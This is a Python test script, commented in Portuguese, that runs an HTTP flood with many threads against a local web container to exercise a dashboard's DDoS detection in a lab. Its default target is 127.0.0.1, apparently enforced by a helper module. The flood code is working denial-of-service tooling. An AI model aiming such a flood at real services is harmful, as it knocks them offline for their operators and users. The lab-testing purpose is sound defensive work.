"""Ataque de negacao de servico (inundacao HTTP) contra o container web, SO em 127.0.0.1.

Varias conexoes ao mesmo tempo pedem a mesma pagina sem parar, durante N segundos.
O que se espera ver no dashboard: pico de requisicoes/s no web (deteccao de DDoS por escore z)
e os outros servicos (db, dns, smtp) continuando verdes, porque o web bate no teto de CPU dele.

Uso (no WSL, com os containers no ar):
    python testes/ataque_ddos.py --segundos 60 --conexoes 50
"""

from __future__ import annotations

import argparse
import threading
import time
from collections import Counter

import requests

import alvo_local

ALVO_PADRAO = "http://127.0.0.1:8080/receitas_pr%C3%A1ticas/home.html"


def inundar(url: str, segundos: float, conexoes: int, mostrar: bool = True) -> dict:
    """Dispara `conexoes` threads pedindo `url` ate o tempo acabar. Devolve o resumo."""
    alvo_local.garantir(url)
    fim = time.monotonic() + segundos
    codigos: Counter[str] = Counter()
    falhas = [0]
    trava = threading.Lock()

    def trabalhador() -> None:
        sessao = requests.Session()
        while time.monotonic() < fim:
            try:
                codigo = str(sessao.get(url, timeout=5).status_code)
                with trava:
                    codigos[codigo] += 1
            except requests.RequestException:
                with trava:
                    falhas[0] += 1     # alvo lento ou caido: conta, nao esconde

    threads = [threading.Thread(target=trabalhador, daemon=True) for _ in range(conexoes)]
    inicio = time.monotonic()
    for t in threads:
        t.start()
    while mostrar and any(t.is_alive() for t in threads):
        time.sleep(5)
        with trava:
            total = sum(codigos.values())
        print(f"  {time.monotonic() - inicio:5.0f} s | {total} respostas | {falhas[0]} falhas", flush=True)
    for t in threads:
        t.join()
    duracao = time.monotonic() - inicio
    total = sum(codigos.values())
    return {"requisicoes": total, "por_codigo": dict(codigos), "falhas": falhas[0],
            "segundos": round(duracao, 1), "rps": round(total / duracao, 1)}


def main() -> None:
    p = argparse.ArgumentParser(description="Inundacao HTTP contra o container web (so 127.0.0.1)")
    p.add_argument("--alvo", default=ALVO_PADRAO)
    p.add_argument("--segundos", type=float, default=60)
    p.add_argument("--conexoes", type=int, default=50)
    args = p.parse_args()
    print(f"Atacando {args.alvo} por {args.segundos:.0f} s com {args.conexoes} conexoes...")
    print(inundar(args.alvo, args.segundos, args.conexoes))


if __name__ == "__main__":
    main()
